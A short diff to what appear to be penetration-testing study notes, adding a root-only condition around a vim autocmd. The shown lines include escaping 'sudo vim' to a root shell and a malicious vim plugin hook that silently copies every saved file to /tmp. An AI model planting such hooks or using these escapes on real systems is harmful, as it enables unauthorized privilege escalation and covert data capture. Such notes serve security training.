@@ -29,6 +29,12 @@ Login as victim user -> sudo vim  /opt/important.conf  -> :shell -> id=root
 
  /home/offsec/.vim/plugin/settings.vim -> :autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
 
+:if $USER == "root"
+:autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
+:endif
+
+
+
 
 
 
